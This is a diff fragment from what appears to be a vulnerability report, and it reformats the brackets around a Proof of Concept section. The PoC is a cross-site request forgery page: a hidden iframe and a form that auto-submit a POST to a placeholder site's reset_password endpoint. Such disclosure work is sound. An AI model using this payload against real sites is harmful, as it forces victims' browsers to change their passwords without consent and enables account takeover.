@@ -64,8 +64,7 @@ Steps to Reproduce
 
 Proof of Concept (PoC)
 
-[
-<html>
+(<html>
   <body>
     <iframe name="hiddenFrame" style="display:none;"></iframe>
     <form action="https://xyz/app/profile/reset_password" method="POST" target="hiddenFrame">
@@ -77,8 +76,7 @@ Proof of Concept (PoC)
       document.forms[0].submit();
     </script>
   </body>
-</html>
-]
+</html>)
 ---
 
 Attack Scenario
